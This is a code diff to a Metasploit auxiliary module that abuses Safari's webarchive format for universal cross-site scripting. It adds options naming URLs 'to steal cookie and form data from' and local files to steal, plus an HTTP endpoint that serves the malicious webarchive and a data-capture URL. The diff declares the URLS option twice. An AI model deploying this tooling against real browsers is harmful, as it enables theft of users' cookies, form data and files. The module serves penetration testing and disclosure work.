@@ -32,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Author'         => 'joev',
 			'References'     =>
 				[
-					# none yet
+					['URL', 'https://community.rapid7.com/community/metasploit/blog/2013/04/25/abusing-safaris-webarchive-file-format']
 				],
 			'DisclosureDate' => 'Feb 22 2013',
 			'Actions'     =>
@@ -50,6 +50,8 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('FILENAME', [ true, 'The file name.',  'msf.webarchive']),
 				OptString.new('URLS', [ true, 'A space-delimited list of URLs to UXSS (eg http//browserscan.rapid7.com/']),
 				OptString.new('URIPATH', [false, 'The URI to receive the UXSS\'ed data', '/grab']),
+				OptString.new('DOWNLOAD_PATH', [ true, 'The path to download the webarhive.', '/msf.webarchive']),
+				OptString.new('URLS', [ true, 'The URLs to steal cookie and form data from.', '']),
 				OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal.', '']),
 				OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing.", true]),
 				OptBool.new('STEAL_FILES', [true, "Enable local file stealing.", true]),
@@ -143,7 +145,7 @@ class Metasploit3 < Msf::Auxiliary
 		}.update(opts['Uri'] || {})
 
 		proto = (datastore["SSL"] ? "https" : "http")
-		print_status("Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")
+		print_status("Data capture URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")
 
 		if (opts['ServerHost'] == '0.0.0.0')
 			print_status(" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
@@ -152,6 +154,20 @@ class Metasploit3 < Msf::Auxiliary
 		# Add path to resource
 		@service_path = uopts['Path']
 		@http_service.add_resource(uopts['Path'], uopts)
+
+		# Add path to download
+		uopts = {
+			'Proc' => Proc.new { |cli, req|
+				resp = Rex::Proto::Http::Response::OK.new
+				resp['Content-Type'] = 'application/x-webarchive'
+				resp.body = @xml.to_s
+				cli.send_response resp
+			},
+			'Path' => webarchive_download_url
+		}.update(opts['Uri'] || {})
+		@http_service.add_resource(webarchive_download_url, uopts)
+
+		print_status("Download URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{webarchive_download_url}")
 
 		# As long as we have the http_service object, we will keep the ftp server alive
 		while @http_service
@@ -176,9 +192,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	# @return [String] contents of webarchive as an XML document
 	def webarchive_xml
-		xml = webarchive_header
-		urls.each_with_index { |url, idx| xml << webarchive_iframe(url, idx) }
-		xml << webarchive_footer
+		return @xml if not @xml.nil? # only compute xml once
+		@xml = webarchive_header
+		urls.each_with_index { |url, idx| @xml << webarchive_iframe(url, idx) }
+		@xml << webarchive_footer
 	end
 
 	# @return [String] the first chunk of the webarchive file, containing the WebMainResource
@@ -288,8 +305,9 @@ class Metasploit3 < Msf::Auxiliary
 	#    NSKeyedArchiver *a = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
 	#    [a encodeObject:response forKey:@"WebResourceResponse"];
 	def web_response_xml(script)
-		# this is a binary plist, but im too lazy to write a real encoder.
-		# ripped this straight out of a safari webarchive save.
+		# this is a serialized NSHTTPResponse, i'm too lazy to write a
+		#   real encoder so yay lets use string interpolation.
+		# ripped this straight out of a webarchive save
 		script['content-length'] = script[:body].length
 		whitelist = %w(content-type content-length date etag
 										Last-Modified cache-control expires)
@@ -711,7 +729,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-	# @return [Array<Array<String>>] list of URLs for remote javascripts that are cacheable
+	# @return [Array<Array<Hash>>] list of headers returned by cacheabke remote javascripts
 	def find_cached_scripts
 		cached_scripts = all_script_urls(urls).each_with_index.map do |urls_for_site, i|
 			begin
@@ -778,6 +796,11 @@ class Metasploit3 < Msf::Auxiliary
 		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
 		port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
 		"#{proto}://#{myhost}#{port_str}"
+	end
+
+	# @return [String] URL that serves the malicious webarchive
+	def webarchive_download_url
+		datastore["DOWNLOAD_PATH"]
 	end
 
 	# @return [Array<String>] of interesting file URLs to steal. Additional files can be stolen
